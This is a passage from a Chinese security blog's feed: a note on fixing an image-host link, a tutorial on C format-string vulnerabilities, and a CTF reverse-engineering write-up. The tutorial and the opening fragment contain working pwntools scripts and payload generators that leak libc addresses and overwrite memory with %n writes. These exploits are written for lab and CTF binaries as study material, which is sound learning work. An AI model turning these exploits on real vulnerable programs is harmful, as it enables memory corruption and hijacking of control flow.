int((hex(stack_point))[-2:],16)print(hex(tag1))payload  = &#39;%&#39; + str(tag1) + &#39;c%6$hhn&#39; + &#39;1&#39;raw_input(&#39;-&gt;&#39;)io.sendline(payload)io.recvuntil(&#39;1&#39;)payload = &#39;%&#39; +  str(key &amp; 0xffff) + &#39;c%14$hn&#39; + &#39;2&#39;raw_input(&#39;-&gt;&#39;)io.sendline(payload)io.recvuntil(&#39;2&#39;)io.sendline(&#39;%18$s&#39;)io.interactive()</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;格式化字符串漏洞题目练习&quot;&gt;&lt;a href=&quot;#格式化字符串漏洞题目练习&quot; class=&quot;headerlink&quot; title=&quot;格式化字符串漏洞题目练习&quot;&gt;&lt;/a&gt;格式化字符串漏洞题目练习&lt;/h1&gt;&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;
      
    
    </summary>
    
    
      <category term="pwn" scheme="http://chumen77.xyz/tags/pwn/"/>
    
      <category term="学习记录" scheme="http://chumen77.xyz/tags/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    
  </entry>
  
  <entry>
    <title>修复七千云外链失效</title>
    <link href="http://chumen77.xyz/2020/03/12/%E4%BF%AE%E5%A4%8D%E4%B8%83%E5%8D%83%E4%BA%91%E5%A4%96%E9%93%BE%E5%A4%B1%E6%95%88/"/>
    <id>http://chumen77.xyz/2020/03/12/修复七千云外链失效/</id>
    <published>2020-03-12T15:17:10.000Z</published>
    <updated>2020-03-13T02:48:54.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="修复七千云外链失效"><a href="#修复七千云外链失效" class="headerlink" title="修复七千云外链失效"></a>修复七千云外链失效</h1><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>自己的以前申请过一个七千云做自己的图床，今晚写博客发现，自己上传不上图片，并且用upic导出来的链接无法显示图片了。查了很久的原因，发现是七千牛原来给我分配的免费外链域名给我断用了。<br><img src="http://qiqianyun.chumen77.xyz/uPic/78YdoJ.png" srcset="/img/loading.gif" alt><br>就是这个没了，自己排错，排了半天才发现。是在这里找到的，好隐蔽。。。<br><img src="http://qiqianyun.chumen77.xyz/uPic/aeXsve.png" srcset="/img/loading.gif" alt><br>然后就在文件管理那里发现，网站提示说如果无法显示图片，加载慢，可以加一个域名。然后我就尝试加了一个，然后就修复好了。</p><h2 id="修复过程"><a href="#修复过程" class="headerlink" title="修复过程"></a>修复过程</h2><h3 id="绑定创建域名"><a href="#绑定创建域名" class="headerlink" title="绑定创建域名"></a>绑定创建域名</h3><p><img src="http://qiqianyun.chumen77.xyz/uPic/XxkzAY.png" srcset="/img/loading.gif" alt><br><img src="http://qiqianyun.chumen77.xyz/uPic/sW0Ju4.png" srcset="/img/loading.gif" alt><br>xxxx也就是填你的域名，前面的可以自定义。点击添加后下面总是会自动又弹出一个空白的框，点击后面的删除，否则，往下滑你会发现就是创建不了这个记录。<br>创建成功后，会提示你复制<strong>CNAME</strong>，复制一下，去往你自己的域名网站，我用的是阿里云。</p><h3 id="去自己的dns解析平台"><a href="#去自己的dns解析平台" class="headerlink" title="去自己的dns解析平台"></a>去自己的dns解析平台</h3><p>￼<br><img src="http://qiqianyun.chumen77.xyz/uPic/meWpeP.png" srcset="/img/loading.gif" alt><br>这里的主机记录填入刚刚你自定义的主机开头，记录值填入刚刚复制的CNAME，就可以了。</p><h3 id="修改upic设置"><a href="#修改upic设置" class="headerlink" title="修改upic设置"></a>修改upic设置</h3><p><img src="http://qiqianyun.chumen77.xyz/uPic/adszoz.png" srcset="/img/loading.gif" alt><br>填入即可，以前写的博客，图片的链接也要改一下，就恢复原来的样子了。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;修复七千云外链失效&quot;&gt;&lt;a href=&quot;#修复七千云外链失效&quot; class=&quot;headerlink&quot; title=&quot;修复七千云外链失效&quot;&gt;&lt;/a&gt;修复七千云外链失效&lt;/h1&gt;&lt;h2 id=&quot;背景&quot;&gt;&lt;a href=&quot;#背景&quot; class=&quot;headerlink&quot; 
      
    
    </summary>
    
    
      <category term="杂项" scheme="http://chumen77.xyz/tags/%E6%9D%82%E9%A1%B9/"/>
    
  </entry>
  
  <entry>
    <title>格式化字符串漏洞小总结（上）</title>
    <link href="http://chumen77.xyz/2020/03/12/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%B0%8F%E6%80%BB%E7%BB%93%EF%BC%88%E4%B8%8A%EF%BC%89/"/>
    <id>http://chumen77.xyz/2020/03/12/格式化字符串漏洞小总结（上）/</id>
    <published>2020-03-12T13:13:41.000Z</published>
    <updated>2020-04-03T09:00:26.012Z</updated>
    
    <content type="html"><![CDATA[<h1 id="格式化字符串漏洞小总结（上）"><a href="#格式化字符串漏洞小总结（上）" class="headerlink" title="格式化字符串漏洞小总结（上）"></a>格式化字符串漏洞小总结（上）</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>记录一下，在学习这个漏洞时候的自己感觉的疑难点，和做题时候的一点小技巧，这一篇主要是记录理论。</p><h2 id="格式化字符串"><a href="#格式化字符串" class="headerlink" title="格式化字符串"></a>格式化字符串</h2><p>基本格式：</p><pre><code class="c">%[parameter][flags][field width][.precision][length]type</code></pre><p>需要重点关注的pattern：</p><ol><li>parameter ：n$，获取格式化字符串中的指定参数</li><li>field width ：输出的最小宽度</li><li>precision ：输出的最大长度</li><li>length，输出的长度 : <code>hh，1-byte ； h，2-byte ； l, 4-byte ；ll,8-byte ；</code></li><li>type :<pre><code class="c"> d/i，有符号整数 u，无符号整数 x/X，16 进制 unsigned int 。x 使用小写字母；X 使用大写字母. s，输出以null 结尾字符串直到精度规定的上限；如果没有指定精度，则输出所有字节。 c，把 int 参数转为 unsigned char 型输出 p， void * 型，输出对应变量的值。printf(&quot;%p&quot;,a) 用地址的格式打印变量 a 的值，printf(&quot;%p&quot;, &amp;a) 打印变量 a 所在的地址。 n，不输出字符，但是把已经成功输出的字符个数写入对应的整型指针参数所指的变量。（仅仅是在这一个printf的函数） %， &#39;%&#39;字面值，不接受任何 flags, width。</code></pre></li></ol><p>参数：就是是要对应输出的变量。</p><h2 id="格式化字符串漏洞原理"><a href="#格式化字符串漏洞原理" class="headerlink" title="格式化字符串漏洞原理"></a>格式化字符串漏洞原理</h2><p>格式化字符串函数是根据格式化字符串函数来进行解析的。那么相应的要被解析的参数的个数也自然是由这个<strong>格式化字符串</strong>所控制。<br><img src="http://qiqianyun.chumen77.xyz/uPic/PnScRI.png" srcset="/img/loading.gif" alt></p><p>根据 <strong>cdecl 的调用约定</strong>,在进入 printf()  函数之前,将参数从右到左依次压栈。进入printf()  之后,函数首先获取第一个参数,一次读取一个字符。如果字符不是    % ,字符直接复制到输出中。否则,读取下一个非空字符,获取相应的参数并解析输出。<br>如上图一样，格式化字符串的参数与后面实际提供的是一一对应的，就不会出现什么问题，但如果在格式化字符串多加几个格式化字符的时候，程序会怎么办呢？<strong>此时其可以正常通过编译，并且在栈上取值，按照给的格式化字符来解析对应栈上的值。此时也就发生了格式化字符串漏洞。</strong></p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="泄露内存数据"><a href="#泄露内存数据" class="headerlink" title="泄露内存数据"></a>泄露内存数据</h3><h4 id="栈上的数据"><a href="#栈上的数据" class="headerlink" title="栈上的数据"></a>栈上的数据</h4><ol><li>利用 % order $ p / % order x 来获取指定参数对应栈的内存值 。(常用%p)</li><li>利用 % order $ s 来获取指定变量所对应地址的内容，只不过有零截断。(这个在做某些ctf题很好用，当一个程序上来读取一个flag到一个位置，然后你在栈上构造这个位置，直接%s就出来flag了。)<h4 id="任意地址内存"><a href="#任意地址内存" class="headerlink" title="任意地址内存"></a>任意地址内存</h4>当想泄露任意地址内存的时候，就需要<strong>想办法把地址写入栈中</strong>。<br>在一般情况下，格式化字符串也是存在栈上的，当可控的时候，就可以直接把某个地址写到这个格式化字符串上，然后找下在这个printf函数中<strong>对应的栈偏移</strong>，然后在用你想用的格式化字符（%p/%x/%s）来操作即可。然后在这个地方，其有个难点就是<strong>找对应的栈偏移</strong>。在我们实际用的时候，其实就是找栈上的某个位置对应这个格式化字符串的偏移，并且也分为32位于64位，因为其传参是不一样的。<h5 id="确定偏移"><a href="#确定偏移" class="headerlink" title="确定偏移"></a>确定偏移</h5><h6 id="32位"><a href="#32位" class="headerlink" title="32位"></a>32位</h6></li></ol><p><img src="http://qiqianyun.chumen77.xyz/uPic/jYXCSU.png" srcset="/img/loading.gif" alt><br>这是32位的栈对应情况，是比较好理解的。如图，并且发现这些指定参数的（如%4$x),其就是对应找对应栈上内容 ，而不指定的%x其找寻找的时候，是看下前面有个几个对应的无指定格式化字符，就想图上的情况，再给一个%x其是会找到arg4。</p><h6 id="64位"><a href="#64位" class="headerlink" title="64位"></a>64位</h6><p>￼<br><img src="http://qiqianyun.chumen77.xyz/uPic/KzxXZK.png" srcset="/img/loading.gif" alt><br>因为64位的参数存放是优先寄存器(rdi,rsi,rdx,rcx,r8,r9)，占满以后第7个参数才会存放在栈上。这就是跟32位找偏移不同地方。</p><h6 id="小技巧"><a href="#小技巧" class="headerlink" title="小技巧"></a>小技巧</h6><p>可以给gdb安装一下pwndbg，在GitHub上面找的到。然后演示一下：</p><pre><code class="c">#include &lt;stdio.h&gt;int main(){        setvbuf(stdout,0,2,0);        char buf[100];        read(0,buf,99);        printf(buf);}</code></pre><p>gdb调试，找图中框框的栈地址，对应的偏移：<br>32位：<br><img src="http://qiqianyun.chumen77.xyz/uPic/MCYXvC.png" srcset="/img/loading.gif" alt><br>64位：<br><img src="http://qiqianyun.chumen77.xyz/uPic/M6uXrw.png" srcset="/img/loading.gif" alt></p><p>注意是对应格式化字符串的偏移。用pwndbg的fmtarg确定偏移，就不用担心数错了。</p><h5 id="写地址进栈"><a href="#写地址进栈" class="headerlink" title="写地址进栈"></a>写地址进栈</h5><p>学会确定偏移后，就可以写地址进栈，来实现读任意地址内存了。经常使用的是，<strong>把这个程序中的某个got地址写进栈，然后就可以了来获取其内容，然后在根据其在libc中的偏移就可以计算出libc的基址，进而算出任意一个函数的地址（如system）</strong>。</p><h6 id="32位："><a href="#32位：" class="headerlink" title="32位："></a>32位：</h6><p>格式：<code>&lt;address&gt;%&lt;order&gt;$s</code><br>这样就可以尝试读出，adress处对应的值，但是因为是%s，其遇到\x00就会直接断了，没有想要的输出。更常有的情况就是，会输出一大堆，然后我们想要的地址掺杂在里面，所以可以改进一下，可以加一组标记，然后再去取出来想要，这样也可以来检测是否被\x00截断了。<br>改进格式：<code>&lt;address&gt;@@%&lt;order&gt;$s@@</code><br>在使用的时候记得除去 <strong>&lt; &gt;</strong>。<br>实例：</p><pre><code class="c">gdb-peda$ got/media/psf/mypwn2/HITCON-Training-master/LAB/lab7/test:     file format elf32-i386DYNAMIC RELOCATION RECORDSOFFSET   TYPE              VALUE08049ffc R_386_GLOB_DAT    __gmon_start__0804a028 R_386_COPY        stdout@@GLIBC_2.00804a00c R_386_JUMP_SLOT   read@GLIBC_2.00804a010 R_386_JUMP_SLOT   printf@GLIBC_2.00804a014 R_386_JUMP_SLOT   __stack_chk_fail@GLIBC_2.40804a018 R_386_JUMP_SLOT   __libc_start_main@GLIBC_2.00804a01c R_386_JUMP_SLOT   setvbuf@GLIBC_2.0</code></pre><p>获取一下got，选择read ： 0x0804a00c ,然后借助pwntools：</p><pre><code class="c">from pwn import *context.log_level = &#39;debug&#39;io = process(&#39;./test&#39;)payload = p32(0x0804a00c) + &#39;@@%6$s@@&#39;# raw_input(&#39;-&gt;&#39;)io.sendline(payload)io.recvuntil(&#39;@@&#39;)print(&#39;leak-&gt;&#39; +hex(u32(io.recv(4))))io.interactive()</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/BP69HU.png" srcset="/img/loading.gif" alt><br>发现出现了异常。<br>修改代码，查一下read在libc的symbols：</p><pre><code class="python">from pwn import *context.log_level = &#39;debug&#39;io = process(&#39;./test&#39;)elf = ELF(&#39;./test&#39;)libc = elf.libcpayload = p32(0x0804a00c) + &#39;@@%6$s@@&#39;# raw_input(&#39;-&gt;&#39;)io.sendline(payload)io.recvuntil(&#39;@@&#39;)print(&#39;leak-&gt;&#39; +hex(u32(io.recv(4))))print(&#39;read-libc.symbols-&gt;&#39; + hex(libc.symbols[&#39;read&#39;]))io.interactive()</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/B6kI8x.png" srcset="/img/loading.gif" alt><br>发现就是因为运气不好，这个libc版本里正好read函数是00结尾的，所以换一下:<br>Printf : 0x0804a010<br><img src="http://qiqianyun.chumen77.xyz/uPic/HwQRgy.png" srcset="/img/loading.gif" alt><br>这就可以了，并且还可以看出来的确是输出来一堆东西。</p><h6 id="64位-1"><a href="#64位-1" class="headerlink" title="64位"></a>64位</h6><p>在64位程序当中，一个地址的高位必定就是0，所以<strong>address是不能写到格式化字符串的最前面的</strong>，可以跟在fmt后面，但是这里就牵涉到了字节对齐问题，并且其偏移量算起来，当格式化字符串不做padding时，偏移量时会因为格式化字符串的长度而发生变化的。所以较好的做法，<strong>就是在格式化字符串处做好padding，这样解决了字节对齐，也解决了偏移量的计算。</strong><br>实例：（还是刚刚的程序编译成64位）</p><pre><code class="python">payload = &#39;@@%6$s@@&#39;.ljust(0x28,&#39;a&#39;) + p64(0x000000601020)</code></pre><p>这次把payload这样写，做好padding，把address写在后面，此时因为偏移会变，gdb调试一下看看，偏移变为多少：<br><img src="http://qiqianyun.chumen77.xyz/uPic/t6RmMP.png" srcset="/img/loading.gif" alt><br>可以看出来偏移为11。<br><img src="http://qiqianyun.chumen77.xyz/uPic/03RQ1J.png" srcset="/img/loading.gif" alt><br>发现再次运气不好，还是得换一个函数打印got，换成read：</p><pre><code class="python">from pwn import *context.log_level = &#39;debug&#39;io = process(&#39;./test3&#39;)elf = ELF(&#39;./test3&#39;)libc = elf.libcpayload = &#39;@@%11$s@@&#39;.ljust(0x28,&#39;a&#39;) + p64(0x000000601028)raw_input(&#39;-&gt;&#39;)io.sendline(payload)io.recvuntil(&#39;@@&#39;)print(&#39;leak-&gt;&#39; +hex(u64(io.recv(6).ljust(8,&quot;\x00&quot;))))print(&#39;read-libc.symbols-&gt;&#39; + hex(libc.symbols[&#39;read&#39;]))io.interactive()</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/mH8zy0.png" srcset="/img/loading.gif" alt><br>这样就OK了。</p><h5 id="小总结"><a href="#小总结" class="headerlink" title="小总结"></a>小总结</h5><ol><li>使用%s 读取内存里的任意位址，%s 会把对应的参数当做 <code>char*</code>指标并将目标做为字符串印出来</li><li>使用限制:Stack 上要有可控制 addres 的buffer ;注意由于是当做字符串打印，所以到 0 时就会中断,也要注意32位跟64位address的写在的位置。<h5 id="小技巧-1"><a href="#小技巧-1" class="headerlink" title="小技巧"></a>小技巧</h5><h6 id="0x1"><a href="#0x1" class="headerlink" title="0x1"></a>0x1</h6>想要泄露libc基址，还有就是通过返回<code>__libc_start_main + x</code>(libc版本不一样可能会不一样，本人是ubuntu16.04)<br><img src="http://qiqianyun.chumen77.xyz/uPic/IFdTkV.png" srcset="/img/loading.gif" alt><br>算一下偏移是21。<pre><code class="python">from pwn import *context.log_level = &#39;debug&#39;io = process(&#39;./test3&#39;)elf = ELF(&#39;./test3&#39;)libc = elf.libcpayload = &#39;%21$p&#39;.ljust(0x8,&#39;a&#39;)raw_input(&#39;-&gt;&#39;)io.sendline(payload)io.recvuntil(&#39;0x&#39;)libc_base = int(io.recv(12),16) - 240 - libc.symbols[&#39;__libc_start_main&#39;]print(&#39;leak-&gt;&#39; +hex(libc_base))io.interactive()</code></pre>运行这个exp来leak libc的基址：<br><img src="http://qiqianyun.chumen77.xyz/uPic/MsG4Nl.png" srcset="/img/loading.gif" alt><br><img src="http://qiqianyun.chumen77.xyz/uPic/R9cYuX.png" srcset="/img/loading.gif" alt><br>成功了。</li></ol><h6 id="0x2"><a href="#0x2" class="headerlink" title="0x2"></a>0x2</h6><p>泄露stack address ：<br><img src="http://qiqianyun.chumen77.xyz/uPic/rBKqdw.png" srcset="/img/loading.gif" alt><br>正如图中所示，会发现栈上说有很多与esp接近的数据，利用合适的数据根据偏移就会拿到esp的值，然后就得到了satck address。常用的也就是多层函数调用时，留下的ebp值。</p><h3 id="覆盖内存"><a href="#覆盖内存" class="headerlink" title="覆盖内存"></a>覆盖内存</h3><p>覆盖内存通常其实就是改写内存，其中分为<strong>改写栈上的内存和任意地址的内存</strong>，从而来控制程序的执行流程。（这里我先只记录一下任意地址的覆盖，改写栈上的内存暂时用不到）<br>这里面主要是使用<code>%n</code>, %n  转换指示符不输出字符，将 当前printf函数已经成功写入流或缓冲区中的字符个数写入对应的整型指针参数所指的变量。其核心就是：<strong>写入的值 = 已经输出的字符数</strong> ，知道这个以后，其<strong>使用起来就是控制好在这次%n前输出正确的字符数</strong>。</p><h4 id="任意地址覆盖"><a href="#任意地址覆盖" class="headerlink" title="任意地址覆盖"></a>任意地址覆盖</h4><ul><li>使用方法类似于%s的任意地址读取，只是换成了%n。</li><li>使用%xc的办法来控制输出的字符数。<br>基本格式： <code>....[overwrite addr]....%[overwrite offset]$n</code><br>其中<code>....</code> 表示我们的填充内容，<code>overwrite addr</code> 表示我们所要覆盖的地址，<code>overwrite offset</code> 地址表示我们所要覆盖的地址存储的位置为输出函数的格式化字符串的第几个参数。也就是构造一个需要写入的address，然后用%xxc来控制写入的字符数，然后把握好偏移。</li></ul><h5 id="fmt字符串写入大小"><a href="#fmt字符串写入大小" class="headerlink" title="fmt字符串写入大小"></a>fmt字符串写入大小</h5><p>因为%n在一次的写入是在一次当中写入int大小的整数，当使用%xc来控制输出一个int大小的字符个数，这个printf函数会输出十分大的字符数量，这个结果对我们说十分不利的，一方面远端程序输出以后，自己接收是一个问题，是十分不稳定的，并且无法精准的控制需要修改的地方。<br>所以常用的是%hn 和%hhn，分别写入short和char大小的整数，然后分成多次写入以组合成完整的int整数，这个过程是十分稳定的。</p><h5 id="单次printf多次写入"><a href="#单次printf多次写入" class="headerlink" title="单次printf多次写入"></a>单次printf多次写入</h5><p>在进行GOT hijack或者改掉某一个指标的时候，通常会要求一次printf内就要来改写完成，不然改一半的值这个指标再被使用时程序很容易崩溃。<br>所以就可以把多个格式化字符串结合在一次，例如：</p><pre><code class="python">%xc%offset1$hn %yc%offset2$hn address address+2</code></pre><p>但这样就说需要小心偏移，并且输出的字符数也要控制好。难点也在控制这个多次写入时，c前面应该填多少的值。</p><h5 id="多次写入时控制输出的字符数"><a href="#多次写入时控制输出的字符数" class="headerlink" title="多次写入时控制输出的字符数"></a>多次写入时控制输出的字符数</h5><p>要注意的是<strong>%n写入的值是其前面输出的字符数。</strong></p><ol><li><p>第一次%xc%hhn的时候，要扣掉前面摆放的address的长度。比如32位时，其前面会摆放4个地址，这个时候就是x需要减去4x4 = 16.</p></li><li><p>之后每个%xc 必需扣掉前一个写入 byte 的值总字符数才会是这个写入需要的长度。比如 第一次写入值为 90 第二个写入 120 此时应为<code>%30c% offset$hhn</code></p></li><li><p>当某一次写入的值比前面写入的要小的时候，就需要整数overflow回来。比如：需要写入的一个字节，用的是hhn的时候，前面那次写入的是0x80，这次写入的是0x50，这时候就用0x50可以加上0x100（256）=0x150 （这时候因为是hhn，在截取的时候就是截取的0x50）， 再减去0x80 = 0xD0（208），也就是填入%208c%offset$hhn即可。</p></li></ol><p>当然这也是很规律的，在控制一个输出字符数，就分为3种情况：</p><ul><li>前面已经输出的字符数小于这次要输出的字符数</li><li>前面已经输出的字符数等于于这次要输出的字符数</li><li>前面已经输出的字符数大于这次要输出的字符数</li></ul><p>然后就可以写成一个脚本来实现自动化控制这个输出字符数：</p><p>单字节：</p><pre><code class="python"># prev 前面已经输出多少字符# val 要写入的值# idx  偏移def fmt_byte(prev,val,idx,byte = 1):    result = &quot;&quot;    if prev &lt; val :        result += &quot;%&quot; + str(val - prev) + &quot;c&quot;    elif prev == val :        result += &#39;&#39;    else :        result += &quot;%&quot; + str(256**byte - prev + val) + &quot;c&quot;    result += &quot;%&quot; + str(idx) + &quot;$hhn&quot;    return result#搭配：prev = 0 payload = &quot;&quot;# x就是你要写入的字节数，例如在改写64位got时常用是6，因为其前两个字节都一样# idx是偏移，key是要写入的目标值for i in range(x):    payload +=fmt_byte(prev,(key &gt;&gt; 8*i) &amp; 0xff,idx+i)     prev = (key &gt;&gt; i*8) &amp; 0xff</code></pre><p>双字节：</p><pre><code class="python">#跟上个基本一样，只是改了部分地方def fmt_short(prev,val,idx,byte = 2):    result = &quot;&quot;    if prev &lt; val :        result += &quot;%&quot; + str(val - prev) + &quot;c&quot;    elif prev == val :        result += &#39;&#39;    else :        result += &quot;%&quot; + str(256**byte - prev + val) + &quot;c&quot;    result += &quot;%&quot; + str(idx) + &quot;$hn&quot;    return resultprev = 0 payload = &quot;&quot;for i in range(x):    payload +=fmt_short(prev,(key &gt;&gt; 16*i) &amp; 0xffff,idx+i)     prev = (key &gt;&gt; i*16) &amp; 0xffff</code></pre><p>在使用这两个脚本的时候，常用的<strong>是在获取到payload的时候也用<code>payload.ljust()</code>做好padding,来控制好字节对齐，然后再摆上需要写入x组的地址。（一会在题目中会有演示）</strong></p><h5 id="pwntools-pwnlib-fmtstr-模块"><a href="#pwntools-pwnlib-fmtstr-模块" class="headerlink" title="pwntools pwnlib.fmtstr 模块"></a>pwntools pwnlib.fmtstr 模块</h5><pre><code class="python">pwnlib.fmtstr.fmtstr_payload(offset, writes, numbwritten=0, write_size=&#39;byte&#39;)</code></pre><ul><li>offset (int):你控制的第一个格式化程序的偏移量</li><li>writes (dict):格式为 {addr: value, addr2: value2},用于往 addr 里写入 value (常用:<code>{printf_got}</code>)</li><li>numbwritten (int):已经由 printf 函数写入的字节数</li><li><code>write_size (str)</code>:必须是 byte,short 或 int。限制你是要逐 byte 写,逐 short 写还是逐 int 写(hhn,hn或n)</li></ul><p>这个函数是十分好用的，具体可以去看一下pwntools的官方介绍，但是实际使用当中，会发现几个问题：</p><ul><li>在64位中，并不好用，自动生成的payload中，它不会将地址放在格式化字符串之后，导致用不了。</li><li>在面对单次printf，实施多次写入的时候其更显的十分无力。</li></ul><p>记录到这里，理论部分就差不多完了，下一篇主要记录的就是题解篇，会包含一些技巧，常见的ctf格式化字符串题目漏洞利用的常见套路，还有格式化字符串漏洞的高级利用（当格式化字符串漏洞的buf在bss上，这就意味着我们无法直接往栈上写地址，该怎么办？并且这种题目常在赛题中出现）</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;格式化字符串漏洞小总结（上）&quot;&gt;&lt;a href=&quot;#格式化字符串漏洞小总结（上）&quot; class=&quot;headerlink&quot; title=&quot;格式化字符串漏洞小总结（上）&quot;&gt;&lt;/a&gt;格式化字符串漏洞小总结（上）&lt;/h1&gt;&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot;
      
    
    </summary>
    
    
      <category term="pwn" scheme="http://chumen77.xyz/tags/pwn/"/>
    
      <category term="学习记录" scheme="http://chumen77.xyz/tags/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    
  </entry>
  
  <entry>
    <title>XCTF\_高校战疫赛\_RE-天津垓</title>
    <link href="http://chumen77.xyz/2020/03/11/XCTF_%E9%AB%98%E6%A0%A1%E6%88%98%E7%96%AB%E8%B5%9B_RE_%20%E5%A4%A9%E6%B4%A5%E5%9E%93/"/>
    <id>http://chumen77.xyz/2020/03/11/XCTF_高校战疫赛_RE_ 天津垓/</id>
    <published>2020-03-11T13:06:03.000Z</published>
    <updated>2020-03-15T06:37:40.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="XCTF-高校战疫赛-RE-天津垓"><a href="#XCTF-高校战疫赛-RE-天津垓" class="headerlink" title="XCTF_高校战疫赛_RE_ 天津垓_"></a>XCTF_高校战疫赛_RE_ 天津垓_</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>复现一个题，当时只做出来第一层加密。因为还没怎么接触反调试跟代码混淆，做不下去了，不过下来复现发现了较为简单的办法出来这个题，也是学到很多，就记录一下。</p><h2 id="初步运行"><a href="#初步运行" class="headerlink" title="初步运行"></a>初步运行</h2><p>发现还需要装个cgwin1.dll，这个很好找，不过要注意64位系统，windows目录下的system32 跟syswow64都要放入。<br><img src="http://qiqianyun.chumen77.xyz/uPic/UJeTGU.png" srcset="/img/loading.gif" alt><br>看来是需要输入判断。</p><h2 id="ida分析"><a href="#ida分析" class="headerlink" title="ida分析"></a>ida分析</h2><p><img src="http://qiqianyun.chumen77.xyz/uPic/9N8fOI.png" srcset="/img/loading.gif" alt><br>这里就是第一层验证了，后来了解到这个是smc加密，我是直接写Python一位位爆破出来的。</p><pre><code class="python">v39 = &#39;Rising_Hopper!&#39;result = &#39;&#39;key = [17,8,6,10,15,20,42,59,47,3,47,4,16,72,62,0,7,16]tag = [0x52,0x69,0x73,0x69,0x6E,0x67,0x5f,0x48,0x6f,0x70,0x70,0x65,0x72,0x21]for i in range(len(key)):    x = 0    flag = 1    while flag:        if ~(x &amp; tag[i % 14]) &amp; (x | tag[i % 14])==key[i] :            flag = 0            result += chr(x)        else:            x += 1print(result)#result = &#39;Caucasus@s_ability&#39;</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/KxEedJ.png" srcset="/img/loading.gif" alt><br><img src="http://qiqianyun.chumen77.xyz/uPic/q0wQpI.png" srcset="/img/loading.gif" alt><br>然后进入这个函数，发现这里根据刚刚解出来的字符串，传入后对*<em>Unk_10040164D *</em> 做了一些处理然后又返回到这堆数据。<br><img src="http://qiqianyun.chumen77.xyz/uPic/bEqzBA.png" srcset="/img/loading.gif" alt><br>直接跟进去是没什么用的。所以需要动态调试，看看程序运行到这里，是怎么样的。</p><p>然后会发现，ida动态调试直接断掉了，肯定是有反调试了。x64可以调试，但是定位关键处有点难，并且看汇编代码也让自己这个菜鸡看吐了。所以就想办法破除对ida的反调试，然后到了关键代码也就是处理以后的Unk10040164D，看看逻辑是也想办法<strong>将其改变成伪代码</strong>，这样就好分析多了。</p><h3 id="patch程序"><a href="#patch程序" class="headerlink" title="patch程序"></a>patch程序</h3><p>￼<br><img src="http://qiqianyun.chumen77.xyz/uPic/A43P7J.png" srcset="/img/loading.gif" alt><br>跟进入引用函数，发现是利用窗口事件来检测是否被调试器调试。并且在其中也发现了ida，这里patch程序可以用<strong>010editor</strong>，直接把ida的相关字眼改成其他的就行。但是要注意不要破坏其他的数据：<br>￼<br><img src="http://qiqianyun.chumen77.xyz/uPic/o7Pjq9.png" srcset="/img/loading.gif" alt><br>我起初改成这样就不行，位位对齐，改成其他字符串就好了。</p><h3 id="ida动态调试："><a href="#ida动态调试：" class="headerlink" title="ida动态调试："></a>ida动态调试：</h3><p><img src="http://qiqianyun.chumen77.xyz/uPic/1biVvy.png" srcset="/img/loading.gif" alt><br>断在这里，然后进入这入Unk10040164D 函数的时候，F7进入：<br><img src="http://qiqianyun.chumen77.xyz/uPic/hyi1pE.png" srcset="/img/loading.gif" alt><br>发现已经有正常的汇编代码出来了（这里我的是已经修改过的），无法f5反编译，这时候可以在最初段push rbp 上面，右键新建一个函数：<br><img src="http://qiqianyun.chumen77.xyz/uPic/rgwAq4.png" srcset="/img/loading.gif" alt><br>整完的样子：<br><img src="http://qiqianyun.chumen77.xyz/uPic/V3341J.png" srcset="/img/loading.gif" alt><br>然后就可以f5反编译了，并且很清晰的就可以看出程序逻辑：<br><img src="http://qiqianyun.chumen77.xyz/uPic/zuetQy.png" srcset="/img/loading.gif" alt><br>然后解密这里：</p><pre><code class="python">flag = &#39;&#39;key = [2007666,2125764,1909251,2027349,2421009,1653372,2047032,2184813,2302911,0x2289F9,1909251,2165130,1968300,0x223D16,2066715,2322594,1987983,0x223D16,1869885,2066715,0x2289F9,1869885,0xEB773,0xE6A90,0xE6A90,0xE6A90,728271,1869885,0x2289F9,2283228,0x223D16,2184813,2165130,2027349,1987983,0x223D16,1869885,2283228,2047032,1909251,2165130,1869885,2401326,1987983,0x223D16,2184813,885735,2184813,2165130,1987983,2460375]for i in range(51) :    flag += chr(int(key[i] / 19683))print(flag)</code></pre><p>然后就拿到flag了。比起很多大师傅的dump核心代码，再进行分析，对我来说还是太难了。感觉在ida里到关键处，创建函数，生成伪代码更简单，也很清晰。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;XCTF-高校战疫赛-RE-天津垓&quot;&gt;&lt;a href=&quot;#XCTF-高校战疫赛-RE-天津垓&quot; class=&quot;headerlink&quot; title=&quot;XCTF_高校战疫赛_RE_ 天津垓_&quot;&gt;&lt;/a&gt;XCTF_高校战疫赛_RE_ 天津垓_&lt;/h1&gt;&lt;h2 id=&quot;前
      
    
    </summary>
    
    
      <category term="RE" scheme="http://chumen77.xyz/tags/RE/"/>
    
  </entry>
  
  <entry>
    <title></title>
    <link href="http://chumen77.xyz/2020/03/11/DNS/"/>
    <id>http://chumen77.xyz/2020/03/11/DNS/</id>
    <published>2020-03-11T06:20:55.000Z</published>
    <updated>2020-03-19T15:00:49.000Z</updated>
    
